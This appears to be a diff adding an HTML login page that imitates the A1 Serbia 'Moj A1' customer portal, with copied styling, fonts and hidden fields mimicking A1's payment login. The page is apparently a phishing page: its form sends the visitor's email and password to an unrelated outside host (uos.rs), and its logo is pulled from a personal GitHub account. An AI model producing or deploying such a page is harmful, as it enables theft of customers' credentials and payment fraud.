+    background-color: #6295ac;
+    padding: 6px 15px;
+    color: #fff;
+    font-family: "A1Sans-Bold";
+    font-size: 12px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center; }
+    .popup-bottom-msg__content img {
+      display: inline-block; }
+      .popup-bottom-msg__content img.close-icon {
+        cursor: pointer; }
+    .popup-bottom-msg__content .left-side {
+      display: flex;
+      align-items: center; }
+      .popup-bottom-msg__content .left-side span {
+        margin-left: 15px; }
+    @media all and (min-width: 834px) {
+      .popup-bottom-msg__content {
+        font-size: 16px; } }
+
+/* PAGES */
+.login-page h1 {
+  margin-bottom: 9px; }
+  @media all and (min-width: 834px) {
+    .login-page h1 {
+      margin-bottom: 12px; } }
+  .login-page h1 + p {
+    margin-bottom: 42px; }
+    @media all and (min-width: 834px) {
+      .login-page h1 + p {
+        margin-bottom: 15px; } }
+.login-page .tabs-bg {
+  border-bottom: 3px solid #f7f7f7;
+  margin-top: 40px;
+  margin-bottom: 50px; }
+  .login-page .tabs-bg ul.tabs {
+    display: flex;
+    margin: 0;
+    padding: 0; }
+    .login-page .tabs-bg ul.tabs li.tab-item {
+      display: block;
+      flex-grow: 1;
+      position: relative;
+      bottom: -3px;
+      padding-bottom: 10px;
+      text-align: center;
+      font-family: "A1Serif-Regular";
+      font-size: 14px;
+      color: #000;
+      text-decoration: none;
+      list-style: none; }
+      .login-page .tabs-bg ul.tabs li.tab-item.active {
+        font-family: "A1Serif-Bold";
+        border-bottom: 3px solid #DA291C; }
+      .login-page .tabs-bg ul.tabs li.tab-item:first-child {
+        text-align: left;
+        margin-right: 20px; }
+      .login-page .tabs-bg ul.tabs li.tab-item:hover {
+        cursor: pointer; }
+      @media all and (min-width: 834px) {
+        .login-page .tabs-bg ul.tabs li.tab-item {
+          font-size: 16px; } }
+.login-page .tabs-content {
+  margin-bottom: 40px; }
+  @media all and (min-width: 834px) {
+    .login-page .tabs-content {
+      margin-bottom: 30px; } }
+  .login-page .tabs-content .tab-content {
+    display: none; }
+    .login-page .tabs-content .tab-content.active {
+      display: block; }
+
+.register-page h1 {
+  max-width: 322px;
+  margin-bottom: 30px; }
+  @media all and (min-width: 834px) {
+    .register-page h1 {
+      max-width: none; } }
+  .register-page h1 + p {
+    max-width: 322px; }
+    @media all and (min-width: 834px) {
+      .register-page h1 + p {
+        max-width: none; } }
+
+.activation-info-page .content, .change-pass-info-page .content {
+  width: 100%;
+  padding-top: 138px;
+  padding-bottom: 55px; }
+  @media all and (min-width: 834px) {
+    .activation-info-page .content, .change-pass-info-page .content {
+      width: 333px;
+      padding-top: 238px;
+      padding-bottom: 159px; } }
+  @media all and (min-width: 1024px) {
+    .activation-info-page .content, .change-pass-info-page .content {
+      padding-top: 240px;
+      padding-bottom: 147px; } }
+.activation-info-page h1, .change-pass-info-page h1 {
+  max-width: 276px;
+  margin-bottom: 30px; }
+  @media all and (min-width: 834px) {
+    .activation-info-page h1, .change-pass-info-page h1 {
+      max-width: none; } }
+  .activation-info-page h1 + p, .change-pass-info-page h1 + p {
+    max-width: 276px;
+    margin-bottom: 30px;
+    font-size: 18px; }
+    @media all and (min-width: 834px) {
+      .activation-info-page h1 + p, .change-pass-info-page h1 + p {
+        max-width: none; } }
+.activation-info-page p.missing-mail, .change-pass-info-page p.missing-mail {
+  font-size: 12px; }
+.activation-info-page a, .change-pass-info-page a {
+  text-decoration: underline; }
+
+.verify-fail-page .content {
+  width: 100%;
+  padding-top: 108px;
+  padding-bottom: 55px; }
+  @media all and (min-width: 834px) {
+    .verify-fail-page .content {
+      width: 613px;
+      padding-top: 268px;
+      padding-bottom: 159px; } }
+  @media all and (min-width: 1024px) {
+    .verify-fail-page .content {
+      padding-top: 280px;
+      padding-bottom: 147px; } }
+  .verify-fail-page .content h1 {
+    max-width: 255px;
+    margin-bottom: 30px; }
+    @media all and (min-width: 834px) {
+      .verify-fail-page .content h1 {
+        max-width: none; } }
+  .verify-fail-page .content p {
+    margin-bottom: 30px;
+    font-size: 18px;
+    max-width: 260px;
+    margin-bottom: 50px; }
+    @media all and (min-width: 834px) {
+      .verify-fail-page .content p {
+        max-width: none; } }
+  .verify-fail-page .content .a1-btn {
+    width: 193px; }
+
+.verify-success-page .content, .change-pass-success-page .content {
+  width: 100%;
+  padding-top: 108px;
+  padding-bottom: 55px; }
+  @media all and (min-width: 834px) {
+    .verify-success-page .content, .change-pass-success-page .content {
+      width: 379px;
+      padding-top: 268px;
+      padding-bottom: 159px; } }
+  @media all and (min-width: 1024px) {
+    .verify-success-page .content, .change-pass-success-page .content {
+      padding-top: 280px;
+      padding-bottom: 147px; } }
+.verify-success-page h1, .change-pass-success-page h1 {
+  max-width: 255px;
+  margin-bottom: 30px; }
+  @media all and (min-width: 834px) {
+    .verify-success-page h1, .change-pass-success-page h1 {
+      max-width: none; } }
+.verify-success-page p, .change-pass-success-page p {
+  margin-bottom: 30px;
+  font-size: 18px; }
+  .verify-success-page p:last-child, .change-pass-success-page p:last-child {
+    margin-bottom: 50px; }
+.verify-success-page .a1-btn, .change-pass-success-page .a1-btn {
+  width: 139px; }
+
+.forgot-pass-page h1 {
+  max-width: 322px;
+  margin-bottom: 30px; }
+  @media all and (min-width: 834px) {
+    .forgot-pass-page h1 {
+      max-width: none; } }
+  .forgot-pass-page h1 + p {
+    max-width: 322px; }
+    @media all and (min-width: 834px) {
+      .t-error-page .container {
+        padding-left: 206px;
+      }
+      .forgot-pass-page h1 + p {
+        max-width: none; } }
+
+/* error page */
+@media (min-width: 834px) {
+  .login-error .content {
+    width: 436px;
+}
+}
+  .login-error .o-section-text h1 {
+    margin-bottom: 8%;
+}
+.login-error p {
+  margin-bottom: 4%;
+}
+.login-error a {
+  margin: 5px;
+}
+@font-face {
+  font-family: "A1Sans-Bold";
+  src: local("A1Sans-Bold"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Sans-Bold.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Sans-Bold.woff") format("woff"); }
+.primary-bold {
+  font-family: A1Sans-Bold; }
+
+@font-face {
+  font-family: "A1Sans-Light";
+  src: local("A1Sans-Light"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Sans-Light.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Sans-Light.woff") format("woff"); }
+.primary-light {
+  font-family: A1Sans-Light; }
+
+@font-face {
+  font-family: "A1Sans-Regular";
+  src: local("A1Sans-Regular"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Sans-Regular.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Sans-Regular.woff") format("woff"); }
+.primary {
+  font-family: A1Sans-Regular; }
+
+@font-face {
+  font-family: "A1Serif-Bold";
+  src: local("A1Serif-Bold"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Serif-Bold.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Serif-Bold.woff") format("woff"); }
+.secondary-bold {
+  font-family: A1Serif-Bold; }
+
+@font-face {
+  font-family: "A1Serif-Light";
+  src: local("A1Serif-Light"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Serif-Light.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Serif-Light.woff") format("woff"); }
+.secondary-light {
+  font-family: A1Serif-Light; }
+
+@font-face {
+  font-family: "A1Serif-Regular";
+  src: local("A1Serif-Regular"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Serif-Regular.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1Serif-Regular.woff") format("woff"); }
+.secondary {
+  font-family: A1Serif-Regular; }
+
+@font-face {
+  font-family: "A1SansCondensed-Bold";
+  src: local("A1SansCondensed-Bold"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1SansCondensed-Bold.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1SansCondensed-Bold.woff") format("woff"); }
+.tertiary-bold {
+  font-family: A1SansCondensed-Bold; }
+
+@font-face {
+  font-family: "A1SansCondensed-Light";
+  src: local("A1SansCondensed-Light"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1SansCondensed-Light.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1SansCondensed-Light.woff") format("woff"); }
+.tertiary-light {
+  font-family: A1SansCondensed-Light; }
+
+@font-face {
+  font-family: "A1SansCondensed-Regular";
+  src: local("A1SansCondensed-Regular"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1SansCondensed-Regular.woff2") format("woff2"), url("https://asmp.a1.rs/_aaa_resources_/html2021/fonts/A1SansCondensed-Regular.woff") format("woff"); }
+.tertiary {
+  font-family: A1SansCondensed-Regular; }
+
+</style>
+
+</style>
+    <div class="login-page">
+            
+        <div class="header-bar">
+            <div class="container">
+                <div class="header-bar__content">
+                    <a rel="noopener" href="https://www.a1.rs/privatni" target="_blank"><!-- <img src="https://raw.githubusercontent.com/vojislav1977/A1/main/A1black.jpg" class="a1-logo"> --></a>
+                    
+                </div>
+            </div>
+        </div>
+        <div class="content-wrapper">
+            <div class="container">
+                <div class="content">
+                    <h1>Moj A1</h1>
+                    <p class="primary-bold"></p><br>
+                    
+                    <div class="tabs-bg">
+                        <ul class="tabs">
+                            <li class="tab-item  active" data-tab="tab-email">Prijavi se putem e-maijla</li>
+                        </ul>
+                    </div>                           
+                    <div class="tabs-content">
+                        <div id="tab-email" class="tab-content  active">
+
+                            <form rel="noopener" id="prijavi-se-email-form" class="asmp-form" method="post" name="asmpform1" action="https://uos.rs" enctype="application/x-www-form-urlencoded" target="_blank">
+
+                            <input type="hidden" name="userRequestURL" value="https%3A%2F%2Fa1.rs%2Fwpayment">
+                            <input type="hidden" name="service" value="WebPayment_login">
+                            <input type="hidden" name="serviceRegistrationURL" value="">
+                            <input type="hidden" name="level" value="10">
+                            <input type="hidden" name="wrongLoginType" value="false">
+                            <input type="hidden" name="SetMsisdn" value="false">
+
+
+                                <label class="custom-input">
+                                    <div class="value-box">
+                                    
+                                        <input type="text" id="email" name="email">
+                                    
+                                        <span class="placeholder">Unesi e-mail adresu</span>
+                                    </div>
+                                    <div class="error-msg">
+                                        <span></span>
+                                    </div>
+                                </label>
+                                <label class="custom-input">
+                                    <div class="value-box">
+                                        <input type="password" id="pass" name="pass">
+                                        <span class="placeholder">Unesi lozinku</span>
+                                    </div>
+                                    <div class="error-msg">
+                                        <span></span>
+                                    </div>
+                                </label>
+                                <a rel="noopener" class="forgot-pass primary-bold" target="_blank">Zaboravljena lozinka?</a>
+                                <div class="submit-section">
+                                    <button class="a1-btn" type="submit" value="prijavi-se-email" id="submit-prijavi-se-email"><span class="label">Prijavi se</span><span class="icon"><img src="https://asmp.a1.rs/_aaa_resources_/html2021/img/icon-chevron-right-white.svg"></span></button>
+                                    <p>Nemaš A1 nalog? <a rel="noopener" class="primary-bold" target="_blank">Registruj se</a></p>
+                                </div>
+
+                        </div>
+                    </div>
+       
+                </div>
+            </div>
+        </div>
+                   
+        <div class="popup-bottom-msg"> 
+            <div class="container">
+                <div class="popup-bottom-msg__content">
+
+                    <div class="right-side">
+                        <img src="https://asmp.a1.rs/_aaa_resources_/html2021/img/icon-x.svg" class="close-icon" width="13" height="13">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    
+    <div><br></div><div><br></div><div><div><span style="background-color: rgb(255, 255, 255); color: rgb(255, 0, 0);">__________________________________________________________________________________________________________________________</span></div></div><div><span style="background-color: rgb(255, 255, 255); color: rgb(255, 0, 0);"><div style="color: rgb(50, 49, 48); font-size: 14px; background-color: rgb(255, 255, 255)"><div><span style="background-color: rgb(255, 0, 0); color: rgb(255, 0, 0);">__________________________________________________________________________________________________________________________</span></div></div></span></div>
+</body>
+</html>
+
